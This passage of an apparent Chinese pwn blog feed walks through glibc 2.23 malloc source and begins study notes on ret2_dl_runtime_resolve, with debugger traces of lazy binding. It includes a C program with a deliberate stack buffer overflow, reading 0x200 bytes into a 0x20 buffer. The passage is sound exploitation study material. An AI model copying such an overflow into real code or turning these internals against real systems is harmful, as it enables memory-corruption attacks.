class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//  找到 smallbin 索引</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">// 判断 bin 中是不是有 chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">// 链表检查</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb); <span class="comment">//设置下一个chunk的 in_use 位</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     大内存分配，进入 malloc_consolidate</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果申请的 nb 位于 smallbin 的范围，就会 fastbin 一样去找对应的项，然后判断 bin 是不是为空，如果不空, 分配第一个 chunk 给用户，分配之前还会校验该 chunk 是不是正确的。如果为空，就会进入 unsorted bin 的处理了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>如果 nb 不满足 smallbin ，就会触发 malloc_consolidate . 然后进入 unsorted bin</p><h3 id="搜索Unsorted-bin"><a href="#搜索Unsorted-bin" class="headerlink" title="搜索Unsorted bin"></a>搜索Unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">// 遍历 unsorted bin</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">             bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">             victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             remainder = chunk_at_offset (victim, nb);</span><br><span class="line">             unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">             av-&gt;last_remainder = remainder;</span><br><span class="line">             remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">             <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">               &#123;</span><br><span class="line">                 remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">             set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">             set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure><p>遍历 unsorted bin ， 如果此时的 unsorted bin 只有一项，且他就是 av-&gt;last_remainder ,同时大小满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)</span><br></pre></td></tr></table></figure><p>就对当前 unsorted bin 进行切割，然后返回切割后的 unsorted bin 。</p><p>否则就先把该 unsorted bin 从 unsorted list 中移除下来，这里用了一个 类似 unlink 的操作，不过没有检查 chunk 的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*先摘下该 unsorted bin  */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// 如果申请的大小和该 unsorted bin的大小刚好相等，就直接返回</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>如果申请的大小和该 unsorted bin 的大小刚好相等，就直接返回， 否则就把它放到相应的 bin 里面去。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              .......</span><br><span class="line">              .......</span><br></pre></td></tr></table></figure></p><h3 id="搜索-Largebin"><a href="#搜索-Largebin" class="headerlink" title="搜索 Largebin"></a>搜索 Largebin</h3><p>接下来就会去搜索 largebin 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">             (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                   victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                   &#123;</span><br><span class="line">                     errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                     <span class="keyword">goto</span> errout;</span><br><span class="line">                   &#125;</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                 set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                 set_foot (remainder, remainder_size);</span><br><span class="line">               &#125;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><h3 id="使用-Top-chunk"><a href="#使用-Top-chunk" class="headerlink" title="使用 Top chunk"></a>使用 Top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line">      <span class="comment">// 如果 top chunk 大小足够大就从 top chunk 里面分配</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果 top chunk 的大小足够就直接切割分配，否则如果此时还有 fastbin 就触发 malloc_consolidate 重复上述流程，如果没有 fastbin 调用 sysmalloc 分配内存</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;文中未做说明 均是指 glibc 2.23&lt;/p&gt;
&lt;h2 id=&quot;简单源码分析&quot;&gt;&lt;a href=&quot;#简单源码分析&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 知识图谱</title>
    <link href="https://nocbtm.github.io/2020/02/25/pwn-%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1/"/>
    <id>https://nocbtm.github.io/2020/02/25/pwn-知识图谱/</id>
    <published>2020-02-25T04:56:05.000Z</published>
    <updated>2020-04-04T12:10:11.469Z</updated>
    
    <content type="html"><![CDATA[<p><img alt="pwn知识图谱.png" data-src="/imgs/pwn_knowledge_map.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img alt=&quot;pwn知识图谱.png&quot; data-src=&quot;/imgs/pwn_knowledge_map.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ret2_dl_runtime_resolve学习笔记</title>
    <link href="https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/"/>
    <id>https://nocbtm.github.io/2020/02/24/ret2_dl_runtime_resolve/</id>
    <published>2020-02-24T10:11:46.000Z</published>
    <updated>2020-04-09T13:12:12.482Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.freebuf.com/articles/system/170661.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170661.html</a><br><a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" target="_blank" rel="noopener">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more</a><br><a href="https://bbs.pediy.com/thread-227034.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-227034.htm</a><br><a href="https://bbs.pediy.com/thread-253833.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-253833.htm</a><br><a href="https://blog.csdn.net/conansonic/article/details/54634142" target="_blank" rel="noopener">https://blog.csdn.net/conansonic/article/details/54634142</a></p><h2 id="前置知识：函数执行流程"><a href="#前置知识：函数执行流程" class="headerlink" title="前置知识：函数执行流程"></a>前置知识：函数执行流程</h2><p>因为程序分为静态链接跟动态链接，因为好多库函数在程序中并不一定都用到，所以在处理动态链接程序的时候，elf文件会采取一种叫做延迟绑定（lazy binding）的技术，也就是当我们位于动态链接库的函数被调用的时候，编译器才会真正确定这个函数在进程中的位置,下面我们通过一个程序来展示这个过程。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc fun.c -fno-stack-protector -m32 -o fun</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fun();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以read函数为例，下断点到read@plt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b *0x80482e0</span></span><br><span class="line">Breakpoint 3 at 0x80482e0</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">►  0x80482e0  &lt;read@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt; </span><br><span class="line"> // 0x804a00c是read的got.plt表地址，里面存放着0x80482e6</span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0 // _dl_runtime_resolve第二个参数</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line">    ↓</span><br><span class="line">   0x80482d0                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; // _dl_runtime_resolve第一个参数</span><br><span class="line">   0x80482d6                              jmp    dword ptr [0x804a008] &lt;0xf7fee000&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0xf7fee000 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt; //执行完_dl_fixup后eax存放着glibc中read函数的地址</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;    pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;    mov    ecx, dword ptr [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;    mov    dword ptr [esp], eax  //把read函数地址存到esp</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;    mov    eax, dword ptr [esp + 4]</span><br><span class="line">   0xf7fee01b &lt;_dl_runtime_resolve+27&gt;    ret    0xc //返回到 read函数</span><br><span class="line">   0xf7fee01e                             nop</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/4xw 0x804a00c</span></span><br><span class="line">0x804a00c:0x080482e60xf7df45400x000000000x00000000</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4xw 0x804a004</span><br><span class="line">0x804a004:0xf7ffd9180xf7fee0000x080482e60xf7df4540</span><br></pre></td></tr></table></figure><p>通过上面一步一步调试，可以清楚看到函数执行流程，call read@plt –&gt;<a href="mailto:read@got.plt" target="_blank" rel="noopener">read@got.plt</a> –&gt;read@plt+6 –&gt;_dl_runtime_resolve(link_map,rel_offest) –&gt; _dl_fixup –&gt; ret _dl_runtime_resolve+16 –&gt; ret read<br>其中_dl_runtime_resolve函数的两个参数 link_map=0xf7ffd918,rel_offest=0，执行完_dl_runtime_resolve()函数后，就返回到了read函数。</p><p>但绑定的过程是在 _dl_fixup中实现的，接下通过_dl_fixup的源码分析一下函数绑定的实现<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> stack 6</span></span><br><span class="line">00:0000│ esp  0xffffcf04 —▸ 0xf7ffd918 ◂— 0x0</span><br><span class="line">01:0004│      0xffffcf08 ◂— 0x0</span><br><span class="line">02:0008│      0xffffcf0c —▸ 0x8048424 (fun+25) ◂— add    esp, 0x10</span><br><span class="line">03:000c│      0xffffcf10 ◂— 0x0</span><br><span class="line">04:0010│      0xffffcf14 —▸ 0xffffcf20 ◂— 0x8000</span><br><span class="line">05:0014│      0xffffcf18 ◂— 0x200</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xf7fee00b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe77e0&gt;</span><br><span class="line">        arg[0]: 0xffffcf94 ◂— 0x0</span><br><span class="line">        arg[1]: 0xffffcf70 ◂— 0x1</span><br></pre></td></tr></table></figure><p>借用Veritas501大佬的图更直观的了解这个过程</p><p><img alt="" data-src="/imgs/ret2-dl-runtime-resolve-1.png" class="lozad"></p><h2 id="ELF关于动态链接的一些关键section"><a href="#ELF关于动态链接的一些关键section" class="headerlink" title="ELF关于动态链接的一些关键section"></a>ELF关于动态链接的一些关键section</h2><p>先熟悉一下几个动态链接的一些关键section，以便于分析源码</p><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><p>包含了一些关于动态链接的关键信息，在这个fun上它长这样，事实上这个section所有程序都差不多</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484B4h&gt;&gt; ; 